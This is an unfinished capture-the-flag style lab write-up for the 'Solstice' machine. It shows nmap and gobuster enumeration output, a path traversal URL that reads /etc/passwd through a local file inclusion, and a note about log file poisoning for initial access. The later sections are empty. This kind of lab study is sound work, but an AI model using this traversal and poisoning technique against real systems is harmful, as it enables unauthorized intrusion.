# Solstice

Difficulty: 2
Tags: apache, log file poisoning
Type: Linux

# Enumeration

- portscan

```bash
# Nmap 7.91 scan initiated Wed Oct  6 09:09:51 2021 as: nmap -p21,22,25,80,139,445,2121,3128,8593,54787,62524 -sV -sC -T4 -Pn -oA 10.0.2.12 10.0.2.12
Nmap scan report for solstice.vuln (10.0.2.12)
Host is up (0.0010s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.0.2.12:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
|_  256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
25/tcp    open  smtp        Exim smtpd 4.92
| smtp-commands: solstice Hello solstice.vuln [10.0.2.15], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.0.2.12:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
62524/tcp open  tcpwrapped
Service Info: Host: solstice; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m02s, deviation: 2h18m34s, median: 1s
|_nbstat: NetBIOS name: SOLSTICE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: \x00
|   NetBIOS computer name: SOLSTICE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-10-06T09:10:15-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-06T13:10:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  6 09:10:19 2021 -- 1 IP address (1 host up) scanned in 28.52 seconds
```

- dir scan

```php
[kali@kali] [~/vulnhub/solstice] $ gobuster dir -u http://10.0.2.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 --no-error -x php,html,txt                                                                  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.12
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/10/06 09:09:48 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 296]
/app                  (Status: 301) [Size: 304] [--> http://10.0.2.12/app/]
/javascript           (Status: 301) [Size: 311] [--> http://10.0.2.12/javascript/]
/backup               (Status: 301) [Size: 307] [--> http://10.0.2.12/backup/]    
/server-status        (Status: 403) [Size: 274]                                   
                                                                                  
===============================================================
2021/10/06 09:12:40 Finished
===============================================================
```

> Proudly powered by phpIPAM 1.4
> 

- LFI at '[http://10.0.2.12:8593/index.php?book=../../../../../../../../../etc/passwd](http://10.0.2.12:8593/index.php?book=../../../../../../../../../etc/passwd)'

apache log file poisoning to gain initial foothold

![Screenshot_2021-10-06_19-29-42.png](Solstice%2081308dc47c3e4e6cb7ad0ae26ffec0ec/Screenshot_2021-10-06_19-29-42.png)

- point it to access.log file present in `/var/log/nginx/access.log`

# Initial Access

# Privilege Escalation

# Notes

-